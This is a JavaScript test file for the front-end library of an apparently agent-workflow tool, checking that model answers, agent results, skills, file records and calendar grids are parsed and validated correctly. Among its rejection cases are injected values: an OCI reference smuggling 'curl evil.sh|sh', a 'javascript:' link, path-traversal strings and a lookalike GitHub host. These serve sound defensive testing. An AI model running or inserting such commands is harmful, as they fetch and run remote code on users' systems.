// Tests for static/lib.js, run in CI with: node --test ui/lib.test.js
const test = require("node:test");
const assert = require("node:assert/strict");
const DD = require("../static/lib.js");

test("outputs that only look like answers or pages are plain text", () => {
  // Review 6: these blanked the whole page.
  for (const bad of ['{"pirn":1}', '{"pirn":1,"model":"m","text":{}}', '{"pirn":1,"model":"","text":"x"}',
    '{"pirn":1,"model":"m","text":"x","inputTokens":"9"}', '{"reed":1}', '{"reed":1,"url":"u","title":{}}',
    '{"reed":1,"url":"u","blocked":"x"}', '{"reed":1,"url":"u","allowed":[1]}', "null", "[]", '"str"', "7"]) {
    assert.deepEqual(DD.parse(bad), { text: bad }, bad);
    assert.equal(DD.preview(bad), bad);
    assert.doesNotThrow(() => DD.decisions("ask", bad));
  }
  assert.deepEqual(DD.parse(undefined), { text: "" });
});

test("real answers and pages are recognised", () => {
  const a = '{"pirn":1,"model":"claude-sonnet-5-5","text":"Yes [n0][n2][n0].","stopReason":"end_turn","inputTokens":4,"outputTokens":2}';
  assert.equal(DD.parse(a).answer.model, "claude-sonnet-5-5");
  assert.deepEqual(DD.decisions("ask", a), [["Model", "claude-sonnet-5-5"], ["Tokens", "4 in, 2 out"], ["Stopped", "on its own (end_turn)"], ["Cited", "[n0] [n2]"]]);
  const p = '{"reed":1,"url":"https://a.example/","title":"A","text":"hi","allowed":["a.example"],"blocked":["https://t.example/"],"blockedTotal":1}';
  assert.equal(DD.parse(p).page.title, "A");
  assert.equal(DD.preview(p), "A\nhi");
  assert.deepEqual(DD.decisions("browse", p), [["Ended at", "https://a.example/"], ["Allowed", "a.example"], ["Refused", "1 requests"]]);
});

test("an assessment's for and against come from their own lines", () => {
  // Review 6: /for:/ matched inside the claim.
  const out = "the cost for: supply will rise: SUPPORTED\n  for:     factory\n  against: carrier, weather\n";
  assert.deepEqual(DD.decisions("assess", out), [["Verdict", "the cost for: supply will rise: SUPPORTED"], ["For", "factory"], ["Against", "carrier, weather"]]);
});

test("durations never read 60 seconds", () => {
  // Review 6: 119.6 s printed as "1 min 60 s".
  assert.equal(DD.dur(119600), "2 min 0 s");
  assert.equal(DD.dur(61000), "1 min 1 s");
  assert.equal(DD.dur(999), "999 ms");
  assert.equal(DD.dur(1500), "1.5 s");
  for (const bad of [NaN, -1, undefined, Infinity]) assert.equal(DD.dur(bad), "");
});

test("a finished run's timeline ends at its last step, not now", () => {
  // Review 6: steps left open by a failed run stretched the axis to now.
  const steps = [
    { status: "Failed", scheduled: "2026-11-01T00:00:00Z", started: "2026-11-01T00:00:01Z", closed: "2026-11-01T00:00:05Z" },
    { status: "Running", scheduled: "2026-11-01T00:00:00Z", started: "2026-11-01T00:00:01Z" },
  ];
  const now = Date.parse("2026-11-02T00:00:00Z");
  const done = DD.span(steps, now, false);
  assert.equal(done.t1 - done.t0, 5000);
  const live = DD.span(steps, now, true);
  assert.equal(live.t1, now);
  for (const s of [DD.span([], now, true), DD.span([{ scheduled: "0001-01-01T00:00:00Z" }], now, false), DD.span([{ scheduled: "junk" }], now, false)]) {
    assert.ok(Number.isFinite(s.t0) && Number.isFinite(s.t1) && s.t1 > s.t0);
  }
});

test("ancestors follow requires and survive cycles and gaps", () => {
  const plan = { nodes: [{ id: "a" }, { id: "b", requires: ["a"] }, { id: "c", requires: ["b", "x"] }, { id: "d", requires: ["d", "c"] }] };
  assert.deepEqual([...DD.ancestors(plan, "c")].sort(), ["a", "b", "x"]);
  assert.deepEqual([...DD.ancestors(plan, "d")].sort(), ["a", "b", "c", "d", "x"]);
  assert.equal(DD.ancestors(undefined, "a").size, 0);
});

test("program tokens keep every character", () => {
  for (const src of ['(pipe (echo "a") echo)', '(ask "unterminated', '  ((( )) "\\"" x', "", "é ü\t\n(x)"]) {
    assert.equal(DD.tokens(src).map((t) => t[1]).join(""), src);
  }
});

const agentJSON = (over) => JSON.stringify(Object.assign({ pirn: 1, agent: 1, model: "claude-sonnet-5-5", text: "Done.", image: "abc", turns: 2,
  commands: [{ command: "ls", exitCode: 0, stdout: "a", ms: 5 }, { command: "false", exitCode: 1, ms: 2 }],
  files: [{ path: "out.txt", size: 2, text: "hi" }], changes: [{ kind: "added", path: "/work/out/out.txt" }], inputs: { n0: "in/n0.txt" },
  stopReason: "end_turn", inputTokens: 20, outputTokens: 6 }, over));

test("agent results are recognised, and only well-formed ones", () => {
  const ok = agentJSON({});
  assert.equal(DD.parse(ok).agent.turns, 2);
  assert.equal(DD.preview(ok), "Done.");
  assert.deepEqual(DD.decisions("agent", ok), [["Model", "claude-sonnet-5-5"], ["Turns", "2"], ["Commands", "2 run, 1 failed"],
    ["Files kept", "out.txt"], ["Changed", "1 paths in the container"], ["Tokens", "20 in, 6 out"], ["Stopped", "on its own (end_turn)"]]);
  for (const bad of [agentJSON({ commands: "x" }), agentJSON({ commands: [{ command: 1, exitCode: 0 }] }), agentJSON({ files: [{ path: "a" }] }),
    agentJSON({ changes: [{ kind: "added" }] }), agentJSON({ inputs: { n0: 1 } }), agentJSON({ model: "" }), agentJSON({ agent: 2 }),
    // Review 7: a change kind like __proto__ broke the page's grouping.
    agentJSON({ changes: [{ kind: "__proto__", path: "/x" }] }), agentJSON({ changes: [{ kind: "renamed", path: "/x" }] }),
    agentJSON({ skippedMore: "3" }), agentJSON({ moreChanges: {} })]) {
    assert.deepEqual(DD.parse(bad), { text: bad });
    assert.doesNotThrow(() => DD.decisions("agent", bad));
  }
});

test("pirn's empty lists and counts are accepted", () => {
  const a = DD.parse(agentJSON({ commands: [], files: [], changes: [], skipped: ["big.bin (too large)"], skippedMore: 4, moreChanges: 2, inputs: {} })).agent;
  assert.ok(a);
  assert.deepEqual(DD.decisions("agent", JSON.stringify(a))[2], ["Commands", "0 run"]);
});

test("a step's recorded files are checked and summarised", () => {
  const b = (c) => c.repeat(40);
  const files = [
    { path: "new.txt", size: 5, status: "added", blob: b("a") },
    { path: "report.txt", size: 9, status: "changed", blob: b("b"), before: b("c") },
    { path: "keep.txt", size: 1, status: "same", blob: b("d"), before: b("d") },
    { path: "gone.txt", size: 3, status: "deleted", before: b("e") },
  ];
  assert.equal(DD.asFiles(files).length, 4);
  assert.equal(DD.fileSummary(files), "1 added, 1 changed, 1 the same, 1 deleted");
  for (const bad of [{ path: "x", size: 1, status: "renamed", blob: b("a") }, { path: "x", size: "1", status: "added", blob: b("a") },
    { path: "x", size: 1, status: "added" }, { path: "x", size: 1, status: "changed", blob: b("a") }, { path: "x", size: 1, status: "deleted", blob: b("a"), before: b("a") },
    { path: "x", size: 1, status: "added", blob: "../../api" }, { path: 1, size: 1, status: "added", blob: b("a") }, null, "x",
    // Review 9: 41 to 63 hex digits were accepted.
    { path: "x", size: 1, status: "added", blob: "a".repeat(41) }]) {
    assert.deepEqual(DD.asFiles([bad]), [], JSON.stringify(bad));
  }
  for (const v of [undefined, null, {}, "x"]) assert.deepEqual(DD.asFiles(v), []);
  assert.equal(DD.fileSummary([]), "");
});

test("sizes read in the largest fitting unit", () => {
  // Review 9: 5 MB read "5120.0 KiB".
  assert.equal(DD.size(0), "0 B");
  assert.equal(DD.size(1023), "1023 B");
  assert.equal(DD.size(1536), "1.5 KiB");
  assert.equal(DD.size(5 * 1024 * 1024), "5.0 MiB");
  assert.equal(DD.size(4 * 1024 ** 3), "4.0 GiB");
  for (const bad of [-1, NaN, undefined, "3"]) assert.equal(DD.size(bad), "");
});

test("files kept in a registry are recognised, and fetched as pirn says", () => {
  const sum = "ab".repeat(32);
  const ok = agentJSON({ files: [{ path: "big.bin", size: 3000000, oci: "ghcr.io/acme/files", sha256: sum }] });
  assert.equal(DD.parse(ok).agent.files[0].oci, "ghcr.io/acme/files");
  for (const bad of [{ path: "a", size: 1, oci: "r" }, { path: "a", size: 1, oci: "ghcr.io/acme/files", sha256: "AB" }, { path: "a", size: 1, sha256: sum },
    { path: "a", size: 1, oci: "ghcr.io/acme/files", sha256: sum, text: "x" },
    // Review 10: any string was accepted, and shown inside a command to copy.
    { path: "a", size: 1, oci: "x; curl evil.sh|sh; #", sha256: sum }, { path: "a", size: 1, oci: "r", sha256: sum },
    { path: "a", size: 1, oci: "ghcr.io/acme/files:v1", sha256: sum }, { path: "a", size: 1, oci: "-ghcr.io/a", sha256: sum }]) {
    assert.deepEqual(DD.parse(agentJSON({ files: [bad] })), { text: agentJSON({ files: [bad] }) }, JSON.stringify(bad));
  }
  // The same string pirn's TestInv_RegistryIsCheckedBeforeAnyContainer expects.
  assert.equal(DD.fetchCommand("ghcr.io/acme/files", "ab", "my report's.bin"), "oras blob fetch --output 'my report'\\''s.bin' ghcr.io/acme/files@sha256:ab");
  assert.equal(DD.fetchCommand("ghcr.io/acme/files", "ab", "-"), "oras blob fetch --output './-' ghcr.io/acme/files@sha256:ab");
});

test("skill nodes are recognised, and only real ones", () => {
  const v = "ab".repeat(20);
  assert.deepEqual(DD.skillOf({ activity: "Skill", args: ["weather", v, "Boston"] }), { name: "weather", version: v, args: ["Boston"] });
  for (const bad of [{ activity: "Agent", args: ["weather", v] }, { activity: "Skill", args: ["weather"] }, { activity: "Skill", args: ["Weather", v] },
    { activity: "Skill", args: ["weather", "HEAD"] }, { activity: "Skill", args: ["../x", v] }, { activity: "Skill" }, null]) {
    assert.equal(DD.skillOf(bad), null, JSON.stringify(bad));
  }
});

test("skills from the API are checked, and source links point only at GitHub", () => {
  const v = "ab".repeat(20), c = "cd".repeat(20);
  const ok = { name: "pdf", description: "Reads PDFs.", version: v, commit: v, source: { repo: "https://github.com/anthropics/skills", path: "skills/pdf", commit: c } };
  assert.ok(DD.asSkill(ok));
  assert.equal(DD.sourceLink(ok.source), `https://github.com/anthropics/skills/tree/${c}/skills/pdf`);
  for (const bad of [{ ...ok, name: "X" }, { ...ok, version: "1" }, { ...ok, description: 1 }, { ...ok, source: { repo: 1 } }, { ...ok, source: null }]) {
    assert.equal(DD.asSkill(bad), null, JSON.stringify(bad));
  }
  for (const bad of [{ repo: "https://gitlab.com/a/b", commit: c }, { repo: "javascript:alert(1)//github.com/a/b", commit: c },
    { repo: "https://github.com/a/b", commit: "main" }, { repo: "https://github.com/a/b", commit: c, path: "../../x" },
    { repo: "https://github.com/a/b/../../evil", commit: c }, { repo: "https://github.com.evil.example/a/b", commit: c }, null]) {
    assert.equal(DD.sourceLink(bad), null, JSON.stringify(bad));
  }
  assert.equal(DD.sourceLink({ repo: "file:///home/me/skills", commit: c }), null);
});

test("a review shows invisible characters as code points", () => {
  // Review 17: bidirectional overrides and zero-width spaces were shown as they are.
  assert.equal(DD.visible("a\u202eb\u200bc\u0000d\u001be"), "a⟨U+202E⟩b⟨U+200B⟩c⟨U+0000⟩d⟨U+001B⟩e");
  assert.equal(DD.visible("tab\tline\nemoji 👩\u200d💻 é"), "tab\tline\nemoji 👩\u200d💻 é");
  assert.equal(DD.visible("\u2066x\u2069\ufeff"), "⟨U+2066⟩x⟨U+2069⟩⟨U+FEFF⟩");
});

test("a picked folder becomes files by path, without hidden ones, within the limit", async () => {
  const f = (path, size = 3) => ({ webkitRelativePath: path, size });
  const read = async (x) => "b64:" + x.webkitRelativePath;
  const got = await DD.readFolder([f("pdf/SKILL.md"), f("pdf/scripts/x.py"), f("pdf/.DS_Store"), f("pdf/.git/HEAD")], read);
  assert.deepEqual(got.files, { "SKILL.md": "b64:pdf/SKILL.md", "scripts/x.py": "b64:pdf/scripts/x.py" });
  assert.equal(got.count, 2); assert.equal(got.skipped, 2);
  assert.match((await DD.readFolder([f("pdf/README.md")], read)).error, /no SKILL.md/);
  assert.match((await DD.readFolder([f("pdf/SKILL.md"), f("pdf/big.bin", DD.MAX_UPLOAD)], read)).error, /more than/);
  assert.equal(DD.base64("é ok"), Buffer.from("é ok").toString("base64"));
});

test("connector calls and writes are shown only when well formed", () => {
  const base = { pirn: 1, model: "m", text: "t", agent: 1, image: "i", turns: 1, commands: [], files: [], changes: [], inputs: {} };
  const ok = { ...base, grant: "mail", tools: [{ connector: "mail", tool: "send", input: "{}", write: "w1" }], writes: [{ id: "w1", connector: "mail", tool: "send", input: {} }] };
  assert.ok(DD.parse(JSON.stringify(ok)).agent);
  for (const bad of [{ ...ok, tools: [{ connector: "mail" }] }, { ...ok, tools: "x" }, { ...ok, writes: [{ id: 1 }] }, { ...ok, tools: [{ ...ok.tools[0], remote: "yes" }] }]) {
    assert.equal(DD.parse(JSON.stringify(bad)).agent, undefined, JSON.stringify(bad));
  }
  const w = { node: "n0", id: "w1", connector: "mail", tool: "send", input: { to: "a" }, status: "waiting" };
  assert.equal(DD.asWrites([w])[0].inputText, '{"to":"a"}');
  for (const bad of [[{ ...w, status: "sent" }], [{ ...w, node: 1 }], "x", [{ ...w, output: {} }]]) assert.deepEqual(DD.asWrites(bad), []);
});

test("a skill's connectors and creation are shown only as strings", () => {
  const sk = { name: "triage", description: "d", version: "a".repeat(40), commit: "b".repeat(40) };
  assert.ok(DD.asSkill({ ...sk, connectors: "linear/search mail", created: "Triage bugs." }));
  for (const bad of [{ ...sk, connectors: ["linear"] }, { ...sk, created: {} }]) assert.equal(DD.asSkill(bad), null);
});

test("a written program never loses the one it replaces", () => {
  // Review 20: describing a task overwrote the editor with no way back.
  assert.equal(DD.replaced("(echo \"mine\")", "(echo \"theirs\")"), "(echo \"mine\")");
  for (const [before, written] of [["", "(echo)"], ["  \n", "(echo)"], ["(echo)", "(echo)"], [undefined, "(echo)"]]) {
    assert.equal(DD.replaced(before, written), "", JSON.stringify(before));
  }
});

test("the calendar groups runs by the local day they started", () => {
  const at = (y, m, d, h) => new Date(y, m, d, h).toISOString();
  assert.equal(DD.dayKey(at(2026, 10, 2, 23)), "2026-11-02");
  for (const bad of ["", undefined, "not a time"]) assert.equal(DD.dayKey(bad), "");
  const runs = [
    { start: at(2026, 10, 2, 9), status: "Completed" }, { start: at(2026, 10, 2, 18), status: "Failed" },
    { start: at(2026, 10, 3, 1), status: "Running" }, { start: "", status: "Completed" },
  ];
  assert.deepEqual(DD.byDay(runs), {
    "2026-11-02": { runs: 2, failed: 1, running: 0 },
    "2026-11-03": { runs: 1, failed: 0, running: 1 },
  });
  assert.equal(DD.onDay(runs, "2026-11-02").length, 2);
  assert.equal(DD.onDay(runs, "").length, 4, "no day is every run");
});

test("a month grid is whole weeks, Monday first, covering every day once", () => {
  for (const [y, m] of [[2026, 10], [2026, 1], [2021, 1], [2026, 11]]) {
    const weeks = DD.monthGrid(y, m);
    const days = weeks.flat();
    assert.ok(weeks.every((w) => w.length === 7));
    assert.equal(new Date(days[0].key + "T12:00").getDay(), 1, `${y}-${m + 1} starts on a Monday`);
    const inMonth = days.filter((d) => d.inMonth).map((d) => d.day);
    assert.deepEqual(inMonth, Array.from({ length: new Date(y, m + 1, 0).getDate() }, (_, i) => i + 1));
    assert.ok(!weeks.at(-1).every((d) => !d.inMonth), "no week of only the next month");
  }
});
